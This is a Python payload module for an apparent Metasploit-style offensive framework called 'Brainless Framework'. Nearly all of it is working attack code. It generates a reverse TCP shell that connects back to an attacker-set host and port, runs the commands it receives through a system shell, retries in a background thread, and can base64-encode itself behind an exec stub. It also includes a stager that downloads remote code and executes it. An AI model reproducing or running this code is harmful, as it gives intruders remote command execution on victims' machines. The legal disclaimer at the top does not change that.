"""
Brainless Framework - Reverse TCP Payload
==========================================

Example payload module for demonstrating Brainless Framework capabilities.
This payload creates a reverse TCP shell connection back to the attacker.

⚠️ Legal Notice: This payload is for educational and authorized testing purposes only.
Unauthorized use against systems you do not own or have permission to test is illegal.

Module Information:
- NAME: Reverse TCP Shell
- DESCRIPTION: Creates a reverse TCP shell connection
- AUTHOR: Brainless Security Team
- TYPE: payload
"""

import socket
import subprocess
import threading
import sys
import os
import time
import base64


# Module metadata (required)
NAME = "Reverse TCP Shell"
DESCRIPTION = "Creates a reverse TCP shell connection back to the attacker"
AUTHOR = "Brainless Security Team"
VERSION = "1.0"
RANK = "excellent"  # Payload reliability ranking


# Module options
OPTIONS = {
    'LHOST': {
        'description': 'Local host to connect back to',
        'required': True,
        'default': None
    },
    'LPORT': {
        'description': 'Local port to connect back to',
        'required': True,
        'default': 4444
    },
    'TIMEOUT': {
        'description': 'Connection timeout in seconds',
        'required': False,
        'default': 30
    },
    'RETRY_DELAY': {
        'description': 'Delay between connection attempts in seconds',
        'required': False,
        'default': 5
    },
    'MAX_RETRIES': {
        'description': 'Maximum number of connection attempts',
        'required': False,
        'default': 10
    },
    'ENCODER': {
        'description': 'Encoder to use (none, base64)',
        'required': False,
        'default': 'none'
    }
}


def get_options():
    """Return module options"""
    return OPTIONS


def set_option(option_name, value):
    """Set a module option"""
    if option_name in OPTIONS:
        OPTIONS[option_name]['default'] = value
        return True
    return False


def run(options=None):
    """
    Main payload execution function
    
    Args:
        options (dict): Payload options
        
    Returns:
        dict: Execution results
    """
    # Get options with defaults
    if options is None:
        options = {}
    
    lhost = options.get('LHOST') or OPTIONS['LHOST']['default']
    lport = int(options.get('LPORT') or OPTIONS['LPORT']['default'])
    timeout = int(options.get('TIMEOUT') or OPTIONS['TIMEOUT']['default'])
    retry_delay = int(options.get('RETRY_DELAY') or OPTIONS['RETRY_DELAY']['default'])
    max_retries = int(options.get('MAX_RETRIES') or OPTIONS['MAX_RETRIES']['default'])
    encoder = options.get('ENCODER') or OPTIONS['ENCODER']['default']
    
    # Validate required options
    if not lhost:
        print("[-] Error: LHOST is required")
        return {'success': False, 'error': 'LHOST is required'}
    
    print(f"[*] Starting reverse TCP payload")
    print(f"[*] Connecting to {lhost}:{lport}")
    print(f"[*] Timeout: {timeout}s, Max retries: {max_retries}")
    
    # Generate the payload
    payload_code = _generate_payload_code(lhost, lport, timeout, encoder)
    
    if encoder == 'base64':
        # Encode payload with base64
        encoded_payload = base64.b64encode(payload_code.encode()).decode()
        print(f"[*] Payload encoded with base64")
        
        # Create decoder stub
        decoder_stub = f"""
import base64
import sys

encoded_payload = "{encoded_payload}"
payload = base64.b64decode(encoded_payload).decode()

exec(payload)
"""
        return {
            'success': True,
            'payload_type': 'reverse_tcp',
            'encoded': True,
            'encoder': 'base64',
            'payload': decoder_stub,
            'target_host': lhost,
            'target_port': lport
        }
    else:
        return {
            'success': True,
            'payload_type': 'reverse_tcp',
            'encoded': False,
            'payload': payload_code,
            'target_host': lhost,
            'target_port': lport
        }


def _generate_payload_code(lhost, lport, timeout, encoder='none'):
    """
    Generate the actual payload code
    
    Args:
        lhost (str): Local host
        lport (int): Local port
        timeout (int): Connection timeout
        encoder (str): Encoder type
    
    Returns:
        str: Generated payload code
    """
    
    # Basic reverse TCP shell payload
    payload = f"""
import socket
import subprocess
import os
import sys
import threading
import time

def reverse_shell():
    while True:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout({timeout})
            
            # Connect to handler
            s.connect(('{lhost}', {lport}))
            
            # Send connection notification
            s.send(b'[+] Reverse shell connected\\n')
            
            # Create pseudo-terminal
            while True:
                try:
                    # Receive command
                    cmd = s.recv(1024).decode('utf-8').strip()
                    
                    if not cmd:
                        break
                    
                    if cmd.lower() in ['exit', 'quit']:
                        break
                    
                    # Execute command
                    if cmd.startswith('cd '):
                        try:
                            os.chdir(cmd[3:])
                            s.send(f'Changed to: {{os.getcwd()}}\\n'.encode())
                        except Exception as e:
                            s.send(f'Error: {{e}}\\n'.encode())
                        continue
                    
                    # Execute system command
                    proc = subprocess.Popen(
                        cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        cwd=os.getcwd()
                    )
                    
                    # Get output
                    stdout = proc.stdout.read()
                    stderr = proc.stderr.read()
                    
                    # Send output back
                    output = stdout + stderr
                    if not output:
                        output = b'Command executed successfully\\n'
                    
                    s.send(output)
                    
                except Exception as e:
                    s.send(f'Error executing command: {{e}}\\n'.encode())
                    break
            
            s.close()
            
        except Exception as e:
            # Connection failed, wait and retry
            time.sleep({timeout})
            continue

# Start the reverse shell in a thread
thread = threading.Thread(target=reverse_shell, daemon=True)
thread.start()

# Keep main thread alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    sys.exit(0)
"""
    
    return payload


def create_stager(lhost, lport, timeout=30):
    """
    Create a stager that downloads and executes the full payload
    
    Args:
        lhost (str): Local host
        lport (int): Local port
        timeout (int): Connection timeout
    
    Returns:
        str: Stager code
    """
    
    stager = f"""
import socket
import sys

def download_and_execute():
    try:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout({timeout})
        
        # Connect to handler
        s.connect(('{lhost}', {lport}))
        
        # Download payload
        payload = b''
        while True:
            data = s.recv(4096)
            if not data:
                break
            payload += data
        
        s.close()
        
        # Execute payload
        if payload:
            exec(payload.decode('utf-8'))
            
    except Exception as e:
        print(f"Stager error: {{e}}")

download_and_execute()
"""
    
    return stager


def get_payload_info():
    """Get information about this payload"""
    return {
        'name': NAME,
        'description': DESCRIPTION,
        'author': AUTHOR,
        'version': VERSION,
        'rank': RANK,
        'options': OPTIONS,
        'type': 'reverse_tcp'
    }


def validate_options(options):
    """
    Validate payload options
    
    Args:
        options (dict): Payload options
    
    Returns:
        tuple: (is_valid, error_message)
    """
    lhost = options.get('LHOST') or OPTIONS['LHOST']['default']
    lport = options.get('LPORT') or OPTIONS['LPORT']['default']
    
    if not lhost:
        return False, "LHOST is required"
    
    try:
        lport = int(lport)
        if lport < 1 or lport > 65535:
            return False, "LPORT must be between 1 and 65535"
    except ValueError:
        return False, "LPORT must be a valid integer"
    
    return True, None


if __name__ == "__main__":
    # This allows the payload to be run directly for testing
    print("This payload is designed to be used within the Brainless Framework")
    print("Use: python3 brainless.py")
    print()
    print("Example usage:")
    print("use exploit/linux/ssh/weak_ssh")
    print("set PAYLOAD reverse_tcp")
    print("set LHOST 192.168.1.100")
    print("set LPORT 4444")
    print("run")